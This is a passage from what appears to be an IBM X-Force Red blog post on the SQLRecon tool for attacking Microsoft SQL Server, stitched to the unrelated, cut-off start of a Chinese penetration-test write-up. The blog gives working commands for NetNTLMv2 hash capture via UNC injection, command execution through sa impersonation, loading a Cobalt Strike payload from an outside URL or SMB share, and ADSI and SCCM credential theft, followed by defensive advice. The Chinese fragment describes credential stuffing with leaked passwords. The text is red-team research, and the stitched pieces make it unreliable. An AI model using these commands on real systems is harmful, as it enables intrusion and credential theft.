post-exploitation tasks from\nJeff\u2019s compromised workstation (DESKTOP-LF8Q3C6). In the following\nscreenshot, I have executed the whoami command. This is just to display\nthat Jeff is not a privileged user and has basic rights within the\nkawalabs.local domain and broader network.\nFigure 2: Issuing the whoami command\nEnumeration\nAt the time of writing, SQLRecon has two enumeration modules that can\nbe used to discover SQL Servers in a network, as well as gain some\ninformation about a SQL Server instance. The following command will\nenumerate Active Directory [82]Service Principal Names (SPNs) and\nidentify if there are any SPNs set for SQL Servers. In the\nkawalabs.local domain, there is an SPN set for a couple of different\naccounts, this is demonstrated in the screenshot below.\nSQLRecon.exe \/e:SqlSpns \/d:kawalabs.local\nScroll to view full table\nFigure 3: Discovering SQL Servers via SPN collection\nThe info module is quite useful to gain additional information about a\nserver. The example below demonstrates the type of information that is\nretrieved from a SQL Server.\nSQLRecon.exe \/a:WinToken \/h:SQL02 \/m:info\nScroll to view full table\nFigure 4: Obtaining information about SQL02\nShout out to Daniel Duggan ([83]@_RastaMouse) for his contributions to\nthe enumeration modules in SQLRecon.\nStandard modules\nStandard modules are executed against a single instance of SQL Server.\nIn the following example, I use the AzureAD authentication provider,\nwhich uses the username and password for an Azure Active Directory\naccount to authenticate against ECOM01, a SQL instance located in the\nAzure cloud. I then use the whoami module to determine the privileges\nJeff has on ECOM01.\nSQLRecon.exe \/a:AzureAD \/d:kawalabs.onmicrosoft.com \/u:jsmith \/p:XXXX\n\/h:ecom01.database.windows.net \/m:whoami\nScroll to view full table\nFigure 5: Enumerating SQL privileges for [email protected]\nBy default, SQLRecon will connect to the master database, as this\ndatabase typically exists on all SQL Server instances. However, you can\neasily list all the different databases on the SQL Server instances by\nusing the databases module.\nSQLRecon.exe \/a:AzureAD \/d:kawalabs.onmicrosoft.com \/u:jsmith \/p:XXXX\n\/h:ecom01.database.windows.net \/m:databases\nScroll to view full table\nFigure 6: Enumerating databases on ECOM01\nYou can connect to other databases by specifying the database name with\nthe \/database: flag and pass forward any module you want to execute. In\nthe example below, I connect to the Payments database on ECOM01 and\nexecute a custom SQL query that will obtain all content from the cc\ntable.\nSQLRecon.exe \/a:AzureAD \/d:kawalabs.onmicrosoft.com \/database:Payments\n\/u:jsmith \/p:XXXX \/h:ecom01.database.windows.net \/m:query \/c:\"select *\nfrom cc;\"\nScroll to view full table\nFigure 7: Obtaining dummy card data from the cc table in the Payments\ndatabase on ECOM01\nMoving into some more interesting modules, SQLRecon supports UNC path\ninjection, which can be performed by a low privilege user account, such\nas KAWALABS\\JSmith. This can result in obtaining hashed credentials,\nwhich in turn can be cracked or passed forward to perform relaying\nstyle attacks. In the following example, I use the WinToken\nauthentication provider, which uses the token for the KAWALABS\\JSmith\nuser account, to authenticate against SQL02, an on-premise server.\nSQLRecon.exe \/a:WinToken \/h:SQL02 \/m:smb \/rhost:\\\\172.16.10.19\\Projects\nScroll to view full table\nFigure 8: UNC path injection\nIn the following screenshot, we can see the connection being made by\nSQL02 to a host in our control (172.16.10.19). This results in\nobtaining the NetNTLMv2 hash for the KAWALABS\\mssql_svc domain account.\nFigure 9: Obtaining the NetNTLMv2 hash for KAWALABS\\mssql_svc\nSQLRecon has a variety of command execution modules that can be used to\nexecute arbitrary commands on the underlying system. This is\nparticularly useful if you are seeking to perform privilege escalation\nand\/or lateral movement. Significant guardrails have been implemented\nthroughout SQLRecon to ensure that operational security is enabled by\ndefault. The two primary guardrails are:\n* Continuous authentication validation, where SQLRecon will validate\nthat it is possible to authenticate against the domain, or SQL\nServer before executing any modules.\n* Execution guardrails, where SQLRecon will validate that optimal\nconditions exist before executing any modules that load objects,\ncreate objects, or execute commands.\n[84]xp_cmdshell has long been one of the most common methods where\ncommands can be executed on the underlying server via a SQL database.\nIn the following example, I used the low privilege KAWALABS\\JSmith\naccount to attempt to launch the notepad.exe application on SQL01.\nSQLRecon.exe \/a:WinToken \/h:SQL01 \/m:xpCmd \/c:notepad.exe\nScroll to view full table\nFigure 10: Demonstration of guardrail preventing command execution from\ntaking place\nAs seen in the image above, an execution guardrail is encountered, and\nan error message is received which indicates that xp_cmdshell is\ndisabled. This is usually the default configuration on most versions of\nSQL Server. The nice thing is, SQLRecon has an enableXp module, which\nwill enable the xp_cmdshell configuration. SQLRecon also has a\ndisableXp module so that you can revert to the original secure state\nafter executing your command with xpCmd.\nSQLRecon.exe \/a:WinToken \/h:SQL01 \/m:enableXp\nScroll to view full table\nFigure 11: Demonstration of another guardrail, where insufficient\nprivileges prevents command execution from taking place\nAs expected, the low privilege KAWALABS\\JSmith account encounters an\nexecution guardrail and received a message that they do not have the\nnecessary privileges to enable or disable xp_cmdshell \u2026 or do they?\nAbusing impersonation\n[85]SQL impersonation is a special permission that essentially enables\na user or group to operate with the permission of another user, as well\nas with their own permissions. The following screenshot is taken from\nthe backend configuration of SQL02 and demonstrates that BUILTIN\\Users\ncan impersonate the sa account.\nFigure 12: BUILTIN\\Users can impersonate the sa account on SQL02\nSQLRecon has an impersonate module to help determine if a user account\ncan impersonate another user.\nSQLRecon.exe \/a:WinToken \/h:SQL02 \/m:impersonate\nScroll to view full table\nAs seen in the screenshot below, the KAWALABS\\JSmith low privilege user\naccount can impersonate the sa account on SQL02. This demonstrates the\nability to execute commands on the SQL instance with admin-like\nprivileges. Furthermore, it means that we can now execute system\ncommands on the underlying server.\nFigure 13: Enumerating accounts that can be impersonated on SQL02\nTo demonstrate another command execution module, SQLRecon can execute\ncommands on the underlying user using [86]OLE Automation Procedures.\nThis uses the odsole70.dll assembly to interact with COM objects so\nthat wscript.shell can be leveraged to run arbitrary system commands.\nImpersonation modules are always prepended with the letter i, and these\nmodules will need the name of the account which is going to be\nimpersonated. In the following example, I connect to SQL02 as the low\nprivilege KAWALABS\\JSmith account and impersonate the sa account to\nenable OLE Automation Procedures on SQL02.\nSQLRecon.exe \/ a:WinToken \/h:SQL02 \/i:sa \/m:iEnableOle\nScroll to view full table\nFigure 14: Enabling OLE Automation Procedures using impersonation\nNow that OLE Automation Procedures is enabled on SQL02, I am in the\nposition to execute any arbitrary command on the underlying server in\ncontext of the user account which has started the SQL Server process.\nIn the following example, I execute a PowerShell child process that\nlists the directory of the same share that was previously used to\ncapture NetNTLMv2 credentials. Keep in mind, this is largely for\ndemonstration purposes and not typically an action that would be\nperformed on an adversary simulation engagement.\nSQLRecon.exe \/a:WinToken \/h:SQL02 \/i:sa \/m:iOleCmd \/c:\"powershell.exe\nls \\\\172.16.10.19\\Projects\"\nScroll to view full table\nFigure 15: Using PowerShell to list a directory on a remote host\nAs seen in the screenshot above, a randomly generated OLE object and\nmethod gets created, the malicious command is then executed, and the\nOLE objects are destroyed. This is intentional as we don\u2019t want to\nleave behind any evidence of our actions.\nIn the following screenshot, we can see the connection being made by\nthe KAWALABS\\mssql_svc user account via SQL02 to a host in our control\n(172.16.10.19). This results in obtaining the NetNTLMv2 hash for the\nKAWALABS \\mssql_svc computer account.\nFigure 16: Obtaining the NetNTLMv2 hash for KAWALABS\\mssql_svc\nThe following example demonstrates using impersonation to execute the\ntasklist command using xp_cmdshell on SQL02.\nSQLRecon.exe \/a:WinToken \/h:SQL02 \/i:sa \/m:iEnableXp\nSQLRecon.exe \/a:WinToken \/h:SQL02 \/i:sa \/m:iXpCmd \/c:tasklist\nScroll to view full table\nFigure 17: Enabling xp_cmdshell and executing system commands using\nimpersonation on SQL02\nIt is always good practice to revert configurations back to the state\nthey were originally in.\nSQLRecon.exe \/a:WinToken \/h:SQL02 \/i:sa \/m:iDisableOle\nSQLRecon.exe \/a:WinToken \/h:SQL02 \/i:sa \/m:iDisableXp\nScroll to view full table\nFigure 18: Disabling OLE Automation Procedures and xp_cmdshell on SQL02\nAttacking linked SQL Servers\nSQLRecon also can perform attacks against linked SQL Server instances.\nThe following screenshot is taken from the backend configuration of\nSQL02 and demonstrates that SQL02 has a link to SQL03. From my\nexperience, this is a common configuration in large enterprise\nnetworks.\nFigure 19: SQL02 has a SQL link to SQL03\nConfiguring a link from one SQL Server instance to another often\nrequires a set of privileged credentials to establish and bind the\nlink. This is beneficial for adversaries as it allows commands to be\nexecuted on the linked SQL Server in context of the account which has\nestablished the connection. Another point of consideration is that\nlinked servers may be segmented from the network that an adversary is\noperating on. This could present the opportunity to traverse\nsegmentation boundaries and enter a network zone of higher security\nrequirements.\nSQLRecon has a links module to determine if a SQL Server has any linked\nSQL instances.\nSQLRecon.exe \/a:WinToken \/h:SQL02 \/m:links\nScroll to view full table\nFigure 20: Enumerating linked SQL servers on SQL02\nLinked modules are always prepended with the letter l, and these\nmodules will need the name of a linked server that you want to issue\ncommands against. In the following example, I connect to SQL02 as the\nlow privilege KAWALABS\\JSmith account and issue the lWhoami command\nagainst the linked SQL03 instance.\nSQLRecon.exe \/a:WinToken \/h:SQL02 \/l:SQL03 \/m:lWhoami\nScroll to view full table\nFigure 21: Enumerating SQL privileges that we can assume on SQL03 via\nSQL02\nAs seen in the screenshot above, we are operating in context of the sa\naccount on SQL03. This is because the sa account was used to establish\nthe SQL link from SQL02 to SQL03.\nAll execution modules in SQLRecon are fully supported on linked SQL\nServers. In the following example, I enable [87]Common Language Runtime\n(CLR) integration on SQL02.\nSQLRecon.exe \/a:WinToken \/h:SQL02 \/l:SQL03 \/m:lEnableClr\nScroll to view full table\nFigure 22: Enabling CLR integration on SQL02\nCLR integration allows custom .NET assembles to be imported into SQL\nServer. These assemblies are stored inside of a [88]stored procedure\nbefore they get executed. This is a nice lateral movement attack\nprimitive.\nIn the following screenshot, I create a custom SQL Server CLR\ncompatible .NET assembly called hollow.dll.  This will store a Cobalt\nStrike payload into a stored procedure named ExecuteShellcode. The\npayload performs [89]basic process hollowing and injects the Cobalt\nStrike shellcode into newly spawned Internet Explorer (iexplore.exe)\nprocess.\nFigure 23: hollow.dll, a SQL Server CLR compatible .NET assembly\nIf you are interested in learning more about custom SQL Server CLR\ncompatible .NET assemblies, please visit the [90]Clr section of the\nSQLRecon wiki. An example of hollow.dll can be found [91]here.\nIn the following demonstration, I have uploaded hollow.dll to a web\nserver and renamed the assembly to favicon.png. I instruct the linked\nSQL03 server to download favicon.png from a web server and perform the\nnecessary steps to import the custom assembly into a SQL Server stored\nprocedure and execute the payload. This results in obtaining a Cobalt\nStrike beacon in context of the KAWALABS\\mssql_svc user on SQL03.\nSQLRecon.exe \/a:WinToken \/h:SQL02 \/l:SQL03 \/m:lClr\n\/dll:https:\/\/cdn.popped.io\/favicon.png \/function:ExecuteShellcode\nScroll to view full table\nFigure 24: Obtaining a Cobalt Strike beacon in context of\nKAWALABS\\mssql_svc on SQL03\nOf course, the previous example requires that SQL03 has Internet access\nfor the assembly to be downloaded from a public-facing web server.\nThere are cases where downloading a foreign resource from a\npublic-facing web server is not possible or desirable. As such,\nSQLRecon allows custom assemblies to be loaded directly from the file\nsystem of the compromised host, or from an SMB share. In the following\ndemonstration, I have uploaded hollow.dll to a local SMB server and\nrenamed the assembly to Reports.xlsx. I instruct the linked SQL03\nserver to download Reports.xlsx from the SMB server and perform the\nnecessary steps to import the custom assembly into a SQL Server stored\nprocedure and execute the payload. This results in obtaining a Cobalt\nStrike beacon in context of the KAWALABS\\mssql_svc user on SQL03.\nSQLRecon.exe \/a:WinToken \/h:SQL02 \/l:SQL03 \/m:lClr\n\/dll:\\\\172.16.10.19\\Projects\\Reports.xlsx \/function:ExecuteShellcode\nScroll to view full table\nFigure 25: Obtaining a Cobalt Strike beacon in context of\nKAWALABS\\mssql_svc<code> on <code>SQL03\nAttacking linked SQL Servers \u2013 ADSI abuse\nSQLRecon also can perform attacks against linked ADSI Server instances\nto obtain cleartext credentials for domain accounts. For additional\ninformation on ADSI tradecraft, please see the Tarlogic [92]blog post.\nThe following screenshot is taken from the backend configuration SQL03\nand demonstrates that SQL03 has an ADSI link to the primary domain\ncontroller in the kawalabs.local domain, DC01. This ADSI link is\nrepresented by the linkADSI object.\nFigure 26: SQL03 has an ADSI link to DC01\nConfiguring an ADSI link from an instance of SQL Server to an Active\nDirectory domain controller does not necessarily require privileged\ncredentials. However, during real-world operations, I have seen cases\nwhere the principle of least privilege has not been applied.\nIn the following example, I use the lLinks module to first connect to\nSQL02, and then query SQL03 for additional linked SQL Server. You can\nthink of this as a double link scenario.\nSQLRecon.exe \/a:WinToken \/h:SQL02 \/l:SQL03 \/m:lLinks\nScroll to view full table\nFigure 27: Enumerating links on SQL03 from SQL02\nNow that we have verified that an ADSI link exists on SQL03, we can\nleverage the lAdsi module to obtain the cleartext domain credentials\nused to configure the ADSI connection from SQL03 to DC01. This involves\nuploading a custom CLR assembly that contains an [93]LDAP server into a\nnew [94]SQL Server runtime routine on SQL03. The LDAP server will then\nexecute and listen for local-only connections on a user supplied port,\nin this case 49103. We then leverage SQL Server agent jobs on SQL03 to\ndirect the credentials used to configure the ADSI connection to solicit\nan LDAP request to the local LDAP server on port 49103. This temporary\nLDAP authentication redirection is what ultimately results in obtaining\ncleartext domain credentials. It should be noted that the Adsi and\niAdsi modules do not use SQL Server agent jobs to initiate the LDAP\nsolicitation process, instead, standard SQL queries are used.\nSQLRecon.exe \/a:WinToken \/h:SQL02 \/l:SQL03 \/m:lAdsi \/rhost:linkADSI\n\/lport:49103\nScroll to view full table\nFigure 28: Double-link ADSI credential gathering attack\nSCCM modules\nOne of the biggest extensions to SQLRecon comes from my colleague Dave\nCossa ([95]@G0ldenGunSec), who has introduced a variety of modules that\ncan be leveraged to abuse Microsoft System Center Configuration Manager\n(SCCM) and Microsoft Endpoint Configuration Manager (ECM). SCCM modules\nwere developed off the back of a real-world engagement, where abusing\nthe SCCM SQL Server database facilitated with furthering our progress\nto objectives. In most cases, to interact with the SCCM database, an\nelevated privilege context needs to be acquired, or access to the SCCM\nserver needs to be obtained. In the examples below, I have a Cobalt\nStrike beacon running in context of the KAWALABS\\mssccm_svc account on\nan ECM server, MECM01.\nI\u2019ll simply refer to both ECM and SCCM as SCCM from this point onwards.\nIn the following example, I use the databases module to enumerate the\ndatabases which exist in the SQL Server instance on MECM01.\nSQLRecon.exe \/a:WinToken \/h:MECM01 \/m:databases\nScroll to view full table\nFigure 29: Enumerating databases on MECM01\nAs seen in the screenshot above, the CM_KAW database exists, which is\nmost likely database configured for SCCM on this server.\nSCCM modules are always prepended with the letter s, and these modules\nwill need the name of the SCCM database that you want to issue commands\nagainst. In the following example, I connect to the CM_KAW database on\nMECM01 as the KAWALABS\\mssccm_svc account and issue the sUsers command.\nThis module enumerates all principals that are configured to logon to\nthe SCCM server.\nSQLRecon.exe \/a:WinToken \/h:MECM01 \/database:CM_KAW \/m:sUsers\nScroll to view full table\nFigure 30: Enumerating all users that can log in to SCCM via the SCCM\nSQL Server database\nIt is also possible to enumerate tasks that have been configured in\nSCCM by using the sTaskList module.\nSQLRecon.exe \/a:WinToken \/h:MECM01 \/database:CM_KAW \/m:sTaskList\nScroll to view full table\nFigure 31: Enumerating tasks configured in SCCM via the SCCM SQL Server\ndatabase\nSCCM will usually need to vault credentials, which are used to\nauthenticate to systems or resources in an environment to deploy\nsoftware packages or perform any of the other various actions provided\nby SCCM. Using the sCredentials module, we can obtain a list of vaulted\ncredentials.\nSQLRecon.exe \/a:WinToken \/h:MECM01 \/database:CM_KAW \/m:sCredentials\nScroll to view full table\nFigure 32: Obtaining vaulted credentials via the SCCM SQL Server\ndatabase\nIn the screenshot above, we can see that one credential has been\nvaulted, and this is the credential for the KAWALABS\\mssccm_svc\naccount.\nUsing Adam Chester\u2019s ([96]@_xpn_) [97]logic, it is possible to decrypt\nSCCM vaulted credentials and obtain the cleartext password for vaulted\naccounts. This does require local administrator privileges on the SCCM\nserver. In the following screenshot, I use the sDecryptCredentials\naccount to decrypt the credential vaulted for the KAWALABS\\mssccm_svc\naccount.\nSQLRecon.exe \/a:WinToken \/h:MECM01 \/database:CM_KAW\n\/m:sDecryptCredentials\nScroll to view full table\nFigure 33: Decrypting vaulted SCCM credentials\nDefensive considerations\nTo prevent attackers from abusing SQL Server, defenders can take a\nlayered approach when implementing security controls. First and\nforemost, I would highly suggest reading the official Microsoft\nguidance on SQL Server [98]security best practices.\nThe next stop should be the prevention, detection, and mitigation\nguidance in the [99]SQLRecon wiki, which has some excellent defensive\nconsiderations. I\u2019ve picked out a couple of the more important controls\nto implement and listed them below.\nNetwork security controls\nThe following security controls should be considered for implementation\nat the network level.\n* Ensure that network routes to SQL Servers have been accounted for\nand limited to only an authorized set of systems, or subnets.\nWorkstations rarely require the ability to communicate directly\nwith SQL Servers. Consider blocking access to TCP 1433 if viable.\n* Verify that network logging and monitoring tools are capturing SQL\nqueries which traverse network boundaries. It would be unusual for\na workstation to send SQL queries to a SQL server.\nEndpoint security controls\nThe following security controls should be considered for implementation\non workstations and servers in the environment.\n* Validate that host-based security controls, such as endpoint\ndetection and response solutions are enabled and that product\nsignatures are fully up to date on a regular basis.\n* Defenders should ensure that .NET Framework v4.8 is installed on\nWindows endpoints and that whatever host-based security product is\nbeing used supports AMSI for .NET. This allows the scanning of .NET\nassemblies in memory.\n* Enable or configure an application allow-listing solution to\nprevent unsigned binaries, such as SQLRecon, from being executed\ndirectly on the endpoint.\nMicrosoft SQL Server security controls\n* Ensure that hardening guidelines have been followed on the\nunderlying Windows Server operating system. Consider only\ninstalling the necessary SQL database components.\n* Ensure that SQL Servers are encompassed in the organizations patch\nmanagement policy and that patches are routinely applied against\nthe SQL service and SQL server.\n* Consider restricting or remove the BUILTIN\\Users account from\nauthenticating against SQL Server instances.\n* Follow the principle of least privilege when configuring roles on\nuser accounts. This principle should also be applied to the service\naccount which starts SQL Server.\n* Remove unnecessary SQL service principal name associations.\n* Use strong passwords for any local account, such as the sa account.\n* Log, centrally ingest and audit SQL Server logon events.\n[100]Netwrix has written a great blog on how this can be achieved.\n* Encrypt sensitive content. This protects datasets from being\nexposed, even if the SQL Server is compromised.\n* Evaluate links between SQL servers and determine the type of\nauthentication binding the link. If possible, elect to use the\ncurrent authentication security context, rather than using the\ncontext of the sa account.\n* Evaluate any impersonations which have been configured and\ndetermine their requirements.\n* If using Azure SQL databases, ensure that Microsoft Advanced Threat\nProtection is enabled and configured to send alerts.\nConclusion\nAttacks against SQL Server continue to be relevant in today\u2019s\ncybersecurity landscape. Adversaries are constantly evolving their\ntechniques to evade defensive controls, and in doing so, they are\nincreasingly exploiting ancillary services, such as SQL Server. These\nattacks have become more sophisticated and stealthier, often employing\nless common techniques to bypass traditional security measures.\nBy abusing SQL Server, adversaries can gain unauthorized access to\nsensitive data, manipulate databases, and even compromise entire\nsystems. The consequences of such attacks can be severe, resulting in\ndata breaches, financial losses, and damage to an organization\u2019s\nreputation.\nTo mitigate the risk of these attacks, it is crucial for organizations\nto review their SQL Server configurations and adopt best practices for\nsecurity. Moreover, organizations should invest in security solutions\nthat provide real-time monitoring, anomaly detection, and behavioral\nanalysis capabilities. These solutions can help detect and respond to\nattacks more effectively, minimizing the potential impact on critical\ndata and systems. By taking proactive measures to secure SQL Server\nenvironments, organizations can significantly reduce the risk of\nfalling victim to these attacks and protect their valuable data assets.\nYou can always find the latest stable version of SQLRecon on the\n[101]X-Force Red Github page.\nIf you\u2019re attending Black Hat Las Vegas and are interested in learning\nmore you can attend my session: [102]Abusing Microsoft SQL Server with\nSQLRecon on Thursday, August 10 at 1:00 pm PT.\n[103]Black Hat | [104]IBM X-Force\nResearch | [105]Microsoft | [106]Offensive security | [107]red\nteam | [108]Vulnerabilty | [109]X-Force\n[110]Sanjiv Kawa\nSenior Managing Security Consultant, Adversary Services, IBM X-Force\nRed\nPOPULAR\n[111]Risk Management January 4, 2024 [112]\nIT and OT cybersecurity: A holistic approach\n8 min read - In the realm of cybersecurity, both information technology\n(IT) and operational technology (OT) present distinct challenges that\norganizations must navigate. Ensuring the security of these distinct\ndomains is paramount to bolstering your overall cyber resilience. By\nfollowing the best practices\u2026\n[113]Risk Management January 3, 2024 [114]\nWhat the cybersecurity workforce can expect in 2024\n4 min read - For cybersecurity professionals, 2023 was a mixed bag of\nopportunities and concerns. The good news is that the number of people\nin cybersecurity jobs has reached its highest number ever: 5.5 million,\naccording to the 2023 ISC2 Global Workforce Study.\u2026\n[115]Risk Management January 9, 2024 [116]\nCybersecurity trends: IBM\u2019s predictions for 2024\n6 min read - As organizations begin planning their cybersecurity\nstrategies for 2024, these expert insights provide guidance on facing\nthe year to come.\nMore from Adversary Services\nDecember 7, 2023\nExploiting GOG Galaxy XPC service for privilege escalation in macOS\n7 min read - Being part of the Adversary Services team at IBM, it is\nimportant to keep your skills up to date and learn new things\nconstantly. macOS security was one field where I decided to put more\neffort this year to further improve my exploitation and operation\nskills in macOS environments. During my research, I decided to try and\ndiscover vulnerabilities in software that I had pre-installed on my\nlaptop, which resulted in the discovery of this vulnerability. In this\narticle, I\u2026\nOctober 30, 2023\nExtending and automating NightHawk with DayBird\n13 min read - NightHawk, MDSec\u2019s commercial C2 product, has focused on\noperational security and detection avoidance since its initial release\nin December 2021. While the core functionality of the framework has\nbeen effective within the scope of these objectives, our team noticed\ncertain features were missing as we started incorporating NightHawk\ninto our engagements alongside our other C2 options. Most notably,\nthere was no equivalent in NightHawk to Cobalt Strike\u2019s Aggressor\nscripting platform, severely limiting automation capabilities. While I\nknow how big of\u2026\nOctober 10, 2023\nCritically close to zero(day): Exploiting Microsoft Kernel streaming service\n10 min read - Last month Microsoft patched a vulnerability in the\nMicrosoft Kernel Streaming Server, a Windows kernel component used in\nthe virtualization and sharing of camera devices. The vulnerability,\nCVE-2023-36802, allows a local attacker to escalate privileges to\nSYSTEM. This blog post details my process of exploring a new attack\nsurface in the Windows kernel, finding a 0-day vulnerability, exploring\nan interesting bug class, and building a stable exploit. This post\ndoesn\u2019t require any specialized Windows kernel knowledge to follow\nalong, though\u2026\nOctober 6, 2023\nReflective call stack detections and evasions\n6 min read - In a blog published this March, we explored reflective\nloading through the lens of an offensive security tool developer,\nhighlighting detection and evasion opportunities along the way. This\ntime we are diving into call stack detections and evasions, and how\nBokuLoader reflectively loads call stack spoofing capabilities into\nbeacon. We created this blog and public release of BokuLoader during\nDylan\u2019s summer 2023 internship with IBM X-Force Red. While researching\ncall stack spoofing for our in-house C2, this was one of\u2026\nTopic updates\nGet email updates and stay ahead of the latest threats to the security\nlandscape, thought leadership and research.\nSubscribe today\nAnalysis and insights from hundreds of the brightest minds in the\ncybersecurity industry to help you prove compliance, grow business and\nstop threats.\n[117]Cybersecurity News [118]By Topic [119]By Industry [120]Exclusive\nSeries [121]X-Force [122]Podcast [123]Events [124]Contact [125]About Us\nFollow us on social\n[126]\u00a9 2024 IBM [127]Contact [128]Privacy [129]Terms of use\n[130]Accessibility [131]Cookie Preferences\n[132]Sponsored by"}
{"text":"Ssrf\u5f15\u53d1\u7684\u8840\u6848\nOriginal \u5148\u950b\u60c5\u62a5\u7ad9 [1]\u9152\u4ed9\u6865\u516d\u53f7\u90e8\u961f\n\u9152\u4ed9\u6865\u516d\u53f7\u90e8\u961f\nWeixin ID anfu-360\nAbout Feature \u77e5\u5176\u9ed1\uff0c\u5b88\u5176\u767d\u3002 \u5206\u4eab\u77e5\u8bc6\u76db\u5bb4\uff0c\u95f2\u804a\u5927\u9662\u8da3\u4e8b\uff0c\u5907\u597d\u9152\u8089\u7b49\u4f60\uff01\nPosted on\n\u8fd9\u662f \u9152\u4ed9\u6865\u516d\u53f7\u90e8\u961f \u7684\u7b2c 132 \u7bc7\u6587\u7ae0\u3002\n\u5168\u6587\u5171\u8ba13041\u4e2a\u5b57\uff0c\u9884\u8ba1\u9605\u8bfb\u65f6\u957f9\u5206\u949f\u3002\n\u8d77\u56e0\n\u6e17\u900f\u80fd\u529b\u7684\u4f53\u73b0\u4e0d\u53ea\u662f\u50a8\u59070day\u7684\u591a\u5c11\uff0c\u8bb8\u591a\u7ad9\u70b9\u80fd\u5426\u88ab\u7a81\u7834\uff0c\u5bf9\u672c\u8eab\u57fa\u7840\u6f0f\u6d1e\u7684\u719f\u7ec3\u7684\u914d\u5408\u5229\u7528\u4e5f\u662f\u4e00\u573a\u8003\u9a8c\uff0c\u6545\u4e8b\u6b63\u662f\u56e0\u673a\u7f18\u5de7\u5408\u62ff\u5230shell\u7684\u4e00\u6b21\n\u8bb0\u5f55\u603b\u7ed3\u3002\n\u4ece\u4fe1\u606f\u641c\u96c6\u5230\u8fdb\u5165\u540e\u53f0\n\u5ba2\u6237\u7ed9\u5b9a\u7684\u5730\u5740\u6253\u5f00\u4e4b\u540e\u5c31\u53ea\u6709\u4e00\u4e2a\u767b\u5f55\u9875\u9762\uff0c\u7559\u4e0b\u6ca1\u6709\u8d26\u53f7\u7684\u6211\u5728\u98ce\u4e2d\u51cc\u4e71\u3002\n[]\n\u4e00\u76f4\u603c\u4e00\u4e2a\u767b\u5f55\u6846\u4e5f\u4e0d\u662f\u4e8b\u513f\u554a\uff0c\u6ca1\u529e\u6cd5\uff0c\u53ea\u80fd\u5148\u5c06\u7aef\u53e3\uff0c\u76ee\u5f55\u548c\u5f31\u53e3\u4ee4\u5148\u63a2\u6d4b\u8d77\u6765\u3002\n[]\n\u7aef\u53e3\u57fa\u672c\u90fd\u5f00\u4e86\u611f\u89c9\u6709\u70b9\u95ee\u9898\uff0cping \u8fc7\u4e4b\u540e\u53d1\u73b0\u6709cdn\u3002\n[]\n\u5f88\u4e0d\u5e78\uff0c\u5f31\u53e3\u4ee4\u6ca1\u7206\u51fa\u6765\uff0c\u76ee\u5f55\u7aef\u53e3\u4e5f\u6ca1\u6709\u592a\u591a\u7684\u53d1\u73b0\uff0c\u5f53\u52a1\u4e4b\u6025\u5c31\u662f\u9700\u8981\u4e00\u4e2a\u8d26\u53f7\u8fdb\u5165\u7cfb\u7edf\u3002\u4f46\u662f\u8d26\u53f7\u4fe1\u606f\u8be5\u4ece\u54ea\u91cc\u641c\u96c6\uff1f\uff1f\uff1f\n[]\n\u7b49\u7b49\uff0c\u9879\u76ee\u5f00\u59cb\u5ba2\u6237\u662f\u63d0\u4f9b\u4e86\u90ae\u7bb1\u5730\u5740\u4f5c\u4e3a\u62a5\u544a\u7684\u63d0\u4ea4\u5730\u5740\u7684\uff0c\u9996\u5b57\u6bcd\u5927\u5199+\u540d@xxx\u7684\u683c\u5f0f\uff0c\u548c\u8bb8\u591a\u4f01\u4e1a\u7684\u547d\u540d\u89c4\u5219\u4e00\u6837\u3002\n\u4e00\u8fb9\u5148\u628a\u4eba\u540d\u5b57\u5178\u6784\u9020\u8d77\u6765\uff0c\u4e00\u8fb9\u901a\u8fc7google\u8bed\u6cd5\u53bb\u641c\u7d22\u76f8\u5173\u90ae\u7bb1\uff0c\u76f8\u5173\u516c\u53f8\u540d\u79f0\uff0c\u8fd0\u6c14\u4e0d\u9519\uff0c\u4ece\u5927\u5927\u5c0f\u5c0f\u51e0\u5341\u4e2a\u7f51\u7ad9\u8bba\u575b\u4e0a\u9762\u53d1\u73b0\u4e03\u516b\u4e2a\u516c\u53f8\u90ae\u7bb1\uff0c\u548c\u51e0\n\u4e2aqq\u90ae\u7bb1\u3002\n[]\n\u7136\u540e\u901a\u8fc7\u4e00\u4e9b\u4e0d\u53ef\u544a\u4eba\u7684\u7684\u624b\u6bb5\u53cd\u67e5\u5230\u4e86\u5176\u4e2d\u67d0\u4e9bqq\u7684\u7ed1\u5b9a\u624b\u673a\u53f7\uff0c\u4ee5\u53ca\u5386\u53f2\u5bc6\u7801\u4fe1\u606f\u3002\n[]\n\u518d\u6b21\u6784\u9020\u76f8\u5173\u5b57\u5178\uff0c\u679c\u7136\u4eba\u4eec\u90fd\u559c\u6b22\u7528\u7c7b\u4f3c\u7684\u5bc6\u7801\uff0c\u649e\u5e93\u6210\u529f\u3002\n[]\n\u8fdb\u5165\u540e\u53f0\u540e\uff0c\u6328\u4e2a\u6d4b\u8bd5\u4e86\u4e00\u904d\u529f\u80fd\u70b9\u90fd\u6ca1\u80fd\u53d1\u73b0getshell\u7684\uff0c\u4e0a\u4f20\u4e5f\u6ca1\u80fd\u7ed5\u8fc7\u540e\u7f00\u9650\u5236\u3002\n[]\n\u90fd\u8bf4\u6ca1\u6709getshell\u7684\u6e17\u900f\u6d4b\u8bd5\u662f\u4e0d\u5230\u4f4d\u7684\uff0c\u53ea\u53d1\u73b0\u4e00\u4e9b\u4e2d\u4f4e\u5371\u6f0f\u6d1e\u53ef\u6ca1\u6cd5\u6ee1\u8db3\u3002\n\u7b80\u5355\u7684\u6743\u9650\u8ba4\u8bc1\u7ed5\u8fc7\n\u56e0\u4e3a\u6ca1\u6709\u592a\u591a\u7684\u6536\u83b7\uff0c\u4e8e\u662f\u6328\u4e2a\u8bbf\u95ee\u4e4b\u524ddirbuster\u8dd1\u51fa\u6765\u7684\u76ee\u5f55\uff0c\u5176\u4e2d\u4e00\u4e2a\u9875\u9762\u8bbf\u95ee\u4e4b\u540e\u4f1a\u6709\u4e00\u9053\u9ed1\u5f71\u4e00\u95ea\u800c\u8fc7\uff0c\u7136\u540e\u8df3\u8f6c\u5230\u767b\u5f55\u9875\u9762\uff0c\u731c\u6d4b\u505a\u4e86\u6743\u9650\n\u9a8c\u8bc1\uff0c\u7136\u540e\u5f3a\u5236\u8df3\u8f6c\u4e86\u3002\n\u6d4b\u8bd5\u4e2d\u6709\u5f88\u591a\u65f6\u5019\u90fd\u53ef\u80fd\u9047\u5230\u65e0\u6743\u9650\u8bbf\u95ee\u7684\u60c5\u51b5\n\u5f53\u6211\u4eec\u9047\u5230\u8bbf\u95ee403\uff0c401\uff0c302\uff0c\u6216\u662f\u5f39\u6846\u63d0\u793a\u65e0\u6743\u9650\u53ef\u4ee5\u5c1d\u8bd5\u4e00\u4e0b\u4ee5\u4e0b\u7684\u529e\u6cd5\u3002\n1. GET \/xxx HTTP\/1.1 